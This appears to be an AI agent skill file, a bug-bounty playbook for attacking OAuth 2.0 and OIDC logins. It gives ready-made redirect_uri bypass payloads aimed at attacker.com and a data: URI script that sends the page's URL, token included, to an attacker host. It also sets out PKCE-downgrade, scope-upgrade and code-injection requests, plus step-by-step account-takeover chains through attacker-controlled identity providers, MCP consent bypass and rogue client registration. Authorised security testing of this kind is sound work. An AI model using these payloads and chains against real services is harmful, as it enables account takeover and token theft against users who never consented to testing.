---
name: hunt-oauth
description: "Modern OAuth 2.0/2.1/OIDC hunting (2025-2026). Use when target has /oauth, /authorize, /token, /callback, OIDC discovery (/.well-known/openid-configuration), 'Login with X', SSO flows, MCP servers, or any code/token grant. Covers redirect_uri bypass matrix, state CSRF, PKCE downgrade (CVE-2025-4144), Authlib CSRF (CVE-2025-68158), client_id confusion, scope upgrade, mutable claims (email_verified, sub), MCP one-click ATO, and chain to full account takeover. Skip if OAuth is purely B2B service-to-service with no user flow."
---

# OAuth 2.0/2.1/OIDC Hunt — 2025-2026 Powerful Edition

OAuth is the single highest-payout auth class in 2025. One redirect_uri bypass = one-click ATO. One mutable-claim trust = mass identity merge.

> **Bounty math:** redirect_uri bypass with chain to ATO pays $3k–$30k consistently. State-CSRF + account-link pays $1k–$10k. PKCE downgrade on a 2025 MCP server can hit Critical.

---

## 0. 60-Second Recon

```bash
# OIDC discovery (always public)
curl -ks https://target.com/.well-known/openid-configuration | jq .
# Common locations
curl -ks https://target.com/.well-known/oauth-authorization-server | jq .
curl -ks https://target.com/oauth/.well-known | jq .

# Extract auth & token endpoints
# Find: authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint, scopes_supported, response_types_supported, grant_types_supported, code_challenge_methods_supported

# Find the OAuth flow in the app
# Look for: /authorize, /oauth, /sso/login, "Continue with Google/Apple/GitHub", /callback, redirect_uri=, response_type=, code=, state=
```

**Fingerprint:**
- Grant types: authorization_code, implicit (legacy/bad), refresh_token, client_credentials, device_code
- response_type: `code`, `token` (implicit — try to force this), `id_token`, `code id_token`
- PKCE support: `code_challenge_methods_supported`: must include `S256`. `plain` allowed = downgrade attack target.
- Registration endpoint open? → dynamic client registration → host attacker client.
- MCP server fingerprint: `/sse` endpoint, `model-context-protocol` header, `mcp-version`.

---

## 1. The Attack Matrix (priority)

| # | Attack | Detection | Effort | Bounty |
|---|--------|-----------|--------|--------|
| 1 | redirect_uri bypass → code theft | path/query/host variation | 10 min | $3k–$30k |
| 2 | State parameter missing / static | omit state, check accepted | 2 min | $500–$5k |
| 3 | PKCE downgrade S256→plain | submit verifier without challenge | 5 min | $1k–$10k |
| 4 | response_type swap (code→token) | force implicit | 5 min | $1k–$5k |
| 5 | response_mode swap (query→fragment) | tighten to fragment for token leak | 5 min | $500–$3k |
| 6 | Client ID confusion | tokens issued for client A used on B | 10 min | $1k–$5k |
| 7 | Scope upgrade | add scope to token request | 5 min | $500–$3k |
| 8 | OIDC mutable claims (email_verified) | sign in with attacker IdP, claim victim email | 10 min | $3k–$30k |
| 9 | MCP one-click ATO | shared client_id, consent bypass | 15 min | $5k–$30k |
| 10 | Dynamic client registration | register attacker client | 5 min | $1k–$10k |
| 11 | Refresh token theft / replay | reuse refresh after logout | 5 min | $500–$3k |
| 12 | Code injection | replay code from victim | 10 min | $2k–$10k |
| 13 | Cookie / session collision with OAuth | OAuth bypasses MFA / step-up | 10 min | $1k–$10k |
| 14 | Subdomain takeover at redirect_uri | dangling CNAME on allowed callback | varies | $5k–$30k |

---

## 2. redirect_uri Bypass Matrix (THE main money-maker)

The OAuth spec says the AS must validate `redirect_uri` against an allowlist. Most flaws are validation shortcuts.

### 2.1 Probe baseline first
```
GET /authorize?client_id=X&redirect_uri=https://app.target.com/cb&response_type=code&state=Z
```
Note the exact allowed callback. Then try mutations:

### 2.2 Path traversal / suffix
```
redirect_uri=https://app.target.com/cb/../../attacker/path
redirect_uri=https://app.target.com/cb/%2e%2e/attacker
redirect_uri=https://app.target.com/cb/..//attacker.com
redirect_uri=https://app.target.com/cb?attacker.com
redirect_uri=https://app.target.com/cb#attacker.com
redirect_uri=https://app.target.com/cb%23.attacker.com
```

### 2.3 Host manipulation (most common payouts)
```
redirect_uri=https://app.target.com.attacker.com/cb         (suffix)
redirect_uri=https://attacker.com/app.target.com/cb         (prefix)
redirect_uri=https://attacker.com@app.target.com/cb         (userinfo)
redirect_uri=https://app.target.com@attacker.com/cb         (userinfo→attacker)
redirect_uri=//attacker.com/cb                              (protocol-relative)
redirect_uri=javascript://attacker.com/%0aalert(1)
redirect_uri=data:text/html,<script>fetch('//attacker/'+location.href)</script>
```

### 2.4 Parameter pollution
```
redirect_uri=https://app.target.com/cb&redirect_uri=https://attacker.com/cb
?redirect_uri=https://app.target.com/cb?redirect_uri=https://attacker.com/cb
```
Some IdPs use first occurrence, app uses last (or vice versa). 6/16 major IdPs vulnerable per academic research.

### 2.5 Open redirect chain
The allowlist accepts `https://app.target.com/*`. App has open redirect at `/redirect?to=`:
```
redirect_uri=https://app.target.com/redirect?to=https://attacker.com
```
Auth code lands at attacker via open-redirect chain.

### 2.6 Subdomain takeover chain
If `*.target.com` is allowed and any subdomain is takeover-able (see `hunt-subdomain-takeover`), claim it → code lands at you.
```
redirect_uri=https://abandoned-app.target.com/cb     (takeover'd)
```

### 2.7 Suffix wildcard
```
redirect_uri=https://allowed-prefix.target.com.attacker.com/cb
```
Some validators check `startswith('https://allowed-prefix.target.com')` → trivially bypassable.

### 2.8 Encoding tricks
```
redirect_uri=https://attacker.com%23.target.com/cb     (%23 = #)
redirect_uri=https://target%2ecom@attacker.com/cb       (%2e = .)
redirect_uri=https://target.com\@attacker.com/cb        (\ in some parsers)
```

### 2.9 Native app schemes (mobile)
```
redirect_uri=com.target.app://oauth         (claim same scheme in attacker app)
redirect_uri=https://target.com/.well-known/assetlinks.json   (universal link confusion)
```

### 2.10 Chain — once redirect_uri lands at attacker

1. Victim clicks the crafted authorize URL (one-click).
2. Auth code appears in attacker's logs.
3. Exchange code at `/token` with victim's client_id and the *same* manipulated redirect_uri (PKCE notwithstanding — see §4).
4. Get access token → full ATO.

---

## 3. State Parameter — CSRF + Account-Link

### 3.1 Missing state
Trivial — auth completes, your code links your account to victim's. PoC:
```
GET /authorize?client_id=X&redirect_uri=https://target.com/cb&response_type=code
   (no state= param)
```
If accepted → CSRF on OAuth → attacker links their identity to victim's account, or steals victim's identity link.

### 3.2 Static / predictable state
Look at multiple auth flows from your account → same state every time? Predictable counter? → CSRF.

### 3.3 State not validated server-side
Check: does the callback handler require state? Some implementations only generate, never check. PoC:
```
GET /callback?code=ATTACKER_CODE&state=                  (empty)
GET /callback?code=ATTACKER_CODE&state=anything
```

### 3.4 Cache-backed state (CVE-2025-68158, Authlib Python)
Authlib stored state in a shared cache. Attacker pre-fetches a valid state, ships it to victim → state validates from cache → CSRF→ATO.
Patched in Authlib >=1.6.6. If target uses Python + Authlib + Redis cache, probe.

### 3.5 Account-link CSRF chain
1. Attacker logs in to target's app normally.
2. Attacker initiates "Link Google" flow.
3. Captures the OAuth URL (state, redirect_uri).
4. Crafts iframe / image / link on attacker.com → victim visits.
5. Victim's existing target session completes the link.
6. Now attacker's Google account is linked to victim's target account → log in as victim via Google.

---

## 4. PKCE Downgrade (CVE-2025-4144 class)

### 4.1 Detect
- `code_challenge_methods_supported`: includes `plain`? Suspicious.
- Server accepts `code_verifier` even when no `code_challenge` was sent in `/authorize`.

### 4.2 Exploit (Cloudflare CVE-2025-4144 pattern)
Original flow:
```
GET /authorize?client_id=X&redirect_uri=...&code_challenge=ABC&code_challenge_method=S256
... (capture code)
POST /token  code_verifier=<original-verifier>
```
Downgrade flow:
```
GET /authorize?client_id=X&redirect_uri=...     (omit code_challenge entirely)
... (capture code via 2.x bypass to attacker)
POST /token  code_verifier=<anything>           (server doesn't enforce when no challenge stored)
```
If the AS doesn't bind code_challenge to the issued code, the verifier becomes optional → bypass.

### 4.3 S256 → plain swap
```
GET /authorize?code_challenge=ABC&code_challenge_method=S256
POST /token  code_verifier=ABC                  (plain match, not S256)
```
If accepted → AS not enforcing the method binding. Some impls match verifier against challenge regardless of method.

---

## 5. response_type / response_mode Tampering

### 5.1 Implicit flow downgrade
```
GET /authorize?response_type=token              (force implicit, token in fragment)
GET /authorize?response_type=token id_token
GET /authorize?response_type=code token         (hybrid)
```
Implicit is deprecated in OAuth 2.1 but many APIs still allow it. Token in URL fragment = vulnerable to Referer leakage, history theft, BFCache leak.

### 5.2 response_mode swap
```
GET /authorize?response_type=code&response_mode=fragment
GET /authorize?response_type=code&response_mode=form_post
GET /authorize?response_type=code&response_mode=web_message
```
Force browser to deliver code via fragment → leaks to JS / Referer. Or via web_message → postMessage to any embedding page (chain with `hunt-postmessage`).

---

## 6. Client ID Confusion

Target accepts tokens from any client_id (doesn't validate the `aud` claim).

### 6.1 Exploit
1. Register your own OAuth client (`registration_endpoint` or developer portal).
2. Get user-tokens normally for your client.
3. Replay those tokens against the **target's** Resource Server.
4. If the RS doesn't check `client_id`/`aud` → tokens work cross-client.

### 6.2 Defense bypass
Check `/userinfo` or any API with a client_X token. If it returns user data for any client → confusion confirmed.

---

## 7. Scope Upgrade

### 7.1 Token request scope expansion
```
POST /token
grant_type=authorization_code
code=<your-code>
scope=read write admin org:* internal              <- request more than you got at /authorize
```
If accepted → scope upgrade. Critical when "admin" or "internal" scopes exist.

### 7.2 Refresh token scope upgrade
```
POST /token
grant_type=refresh_token
refresh_token=<your-rt>
scope=admin                                         <- add admin during refresh
```
Same class of bug.

---

## 8. OIDC Mutable Claims (2025 mass-ATO pattern)

### 8.1 The flaw
App identifies users by `email` claim instead of `sub`. Attacker controls an IdP (Azure AD tenant, self-hosted Keycloak, Google Workspace) → sets `email` to victim's address.

### 8.2 Exploit steps
1. Create Azure AD tenant (free) or self-host Keycloak.
2. Add user with email = `victim@target.com`.
3. Set `email_verified=true` in your IdP (Azure tenant admin can do this).
4. Use "Sign in with [your-IdP]" on target.
5. Target's `findOrCreate(user.email)` matches victim's existing account.
6. Log in as victim.

### 8.3 Critical claim list
| Claim | Why dangerous |
|-------|---------------|
| `email` | Used for account matching → email-confusion ATO |
| `email_verified` | Trust elevation if app gates features on this |
| `preferred_username` | Often used for user matching |
| `phone_number` | Account merge attacks |
| `groups` / `roles` | Privilege escalation |
| `iss` | Issuer trust — if app accepts any issuer in discovery list |

### 8.4 Test plan
- Create test-victim account on target with `victim+test@gmail.com`
- Spin up Keycloak/Azure tenant
- Add user `victim+test@gmail.com` with email_verified=true in your IdP
- Try OAuth login → confirm ATO

---

## 9. MCP / AI Agent OAuth (2025 emerging class)

### 9.1 Fingerprint
- `/sse` endpoint or `Accept: text/event-stream`
- Discovery: `/.well-known/oauth-authorization-server` on `mcp.<target>.com`
- Client_id often `mcp` or `claude-mcp` or `cursor`

### 9.2 Common flaws
1. **Single shared static client_id** — multiple MCP servers use one client_id from upstream IdP → confusion.
2. **Consent bypass** — once attacker completed consent once, upstream skips re-prompt → victim clicks → code to attacker.
3. **State not bound to user session** — classic CSRF.
4. **Redirect_uri allows wildcards** for development.

### 9.3 Exploit (one-click ATO chain)
1. Attacker creates account on target.
2. Initiates MCP OAuth flow, captures consent URL.
3. Tampers `redirect_uri` to attacker.com (or uses one of §2 bypasses).
4. Sends crafted link to victim.
5. Victim already authed at upstream IdP → consent skipped → code to attacker.com.
6. Attacker exchanges code → access token for victim's account.

Bounty: $5k–$30k. See: Obsidian Security disclosures, July-Aug 2025.

---

## 10. Dynamic Client Registration

If `/register` or `/oauth/clients` is open:
```
POST /register
{
  "client_name": "attacker",
  "redirect_uris": ["https://attacker.com/cb"],
  "grant_types": ["authorization_code","refresh_token"],
  "token_endpoint_auth_method": "none"
}
```
If accepted → attacker now has a valid client_id with attacker-controlled redirect_uri. Often combined with §6 client confusion.

---

## 11. Refresh Token Attacks

- **Rotation absent** — same refresh_token works repeatedly. After logout, RT still issues access tokens.
- **RT in URL** — RT leaks via Referer / logs / window.history.
- **Cross-tenant RT** — RT for tenant A issues access tokens for tenant B's API.
- **Family-tracking absent** — stolen RT can be replayed alongside legitimate RT chain.

---

## 12. Code Injection Attacks

Less common but high-impact:
```
POST /token
code=<other-user-code>                  <- if you snooped or guessed
client_id=YOUR_CLIENT
client_secret=YOUR_SECRET
redirect_uri=<original-redirect>
```
Test: does the AS bind the code to the original client? If you can exchange another client's code → catastrophic.

---

## 13. OAuth + MFA Bypass

OAuth often bypasses MFA. Once you have a valid auth code or token, the app may skip step-up. Test:
1. Enable MFA on victim's account.
2. Use OAuth login flow with valid code for that account.
3. Did MFA prompt appear?

If no → OAuth bypasses MFA → chain with `hunt-mfa-bypass`.

---

## 14. Chain Templates (the money chains)

```
redirect_uri bypass + open redirect on target = auth code to attacker = ATO
redirect_uri bypass + subdomain takeover = persistent ATO
state CSRF + account-link = identity hijack
PKCE downgrade + redirect_uri bypass = code-grant downgrade on PKCE-required app
OIDC mutable email = mass ATO (any user reachable via owned IdP)
MCP shared client_id + consent bypass = AI agent one-click ATO
Open registration + client confusion + token replay = cross-client ATO
Implicit downgrade + token in fragment = referer leakage = ATO
```

---

## 15. Disclosed Reports (2024-2025 patterns)

| Target | Bounty | Technique |
|--------|--------|-----------|
| Multiple H1 programs | $20k–$30k | redirect_uri partial-match bypass → code theft → ATO |
| GitHub (researcher) | $25k | response_type confusion → token leak |
| Slack | $2k+ | state parameter missing on Google OAuth → CSRF |
| Twitter/X | $5k+ | OAuth response_type → XSS on redditmedia → ATO |
| LINE | $1,989 | reflected XSS in OAuth callback (chain) |
| Shopify | $1,750 | XSS during Google login flow |
| Cloudflare workers-oauth | CVE-2025-4144 | PKCE downgrade bypass |
| Python Authlib | CVE-2025-68158 | cache-backed state CSRF → account-link |
| Multiple MCP servers (Obsidian) | $5k–$30k | one-click ATO via consent bypass |

---

## 16. Tools

```bash
# Burp suite plugins
"OAuth Scan"  (Burp ext)
"AuthMatrix"  (visualize per-user)
"OAuth Helper"

# CLI scanners
oauthscan -u https://target.com/.well-known/openid-configuration
hop  (https://github.com/Snifer/security-cheatsheets/blob/master/oauth.md)
ssrfmap     # if you can SSRF the discovery endpoint, redirect
mitmproxy -s oauth-tampering.py     # inline replay

# OIDC discovery harvest
curl -ks https://target.com/.well-known/openid-configuration | jq '. as $r | $r.authorization_endpoint, $r.token_endpoint, $r.scopes_supported, $r.response_types_supported, $r.grant_types_supported, $r.code_challenge_methods_supported'
```

---

## 17. Validation Gate

Before reporting:
1. Did you actually land an auth code at attacker.com? (Or just observe the redirect happened?)
2. Did you exchange the code at `/token` and get a working access token?
3. Can you read or modify victim's data with that token? (`/userinfo`, `/me`, an action endpoint)
4. Cross-account PoC: test account A → victim test account B → token gives access to B?
5. Not a CSRF token issue dressed as OAuth? (some "state missing" reports are just CSRF.)

---

## 18. Quick Decision Tree

```
OAuth/OIDC flow visible?
├── redirect_uri reflected?         -> §2 bypass matrix (try all 10)
├── state parameter missing?        -> §3.1 trivial CSRF
├── PKCE present?                   -> §4 downgrade
├── response_type editable?         -> §5 implicit force
├── Multiple clients on same RS?    -> §6 client confusion
├── /register reachable?            -> §10 register attacker client
├── OIDC + email-based identity?    -> §8 mutable claims
├── MCP server?                     -> §9 one-click ATO
└── Open redirect on app?           -> §2.5 + redirect_uri bypass chain

Got code at attacker -> exchange at /token -> /userinfo -> §14 chain.
```

---

## 19. Mantras

- The bypass that pays Critical: redirect_uri with a chain to actual code theft + token exchange.
- "State is missing" alone is N/A. Show the CSRF→account-link→ATO chain.
- OIDC `email` claim is mutable on any IdP you control. `sub` is the only trusted identifier.
- Test every callback path. Test every mode (code/token/id_token). Test every encoding.
- MCP servers are 2025's new attack surface. Shared client_id + consent bypass = goldmine.
- One-click ATO > one-action chain. The shorter the victim interaction, the higher the bounty.
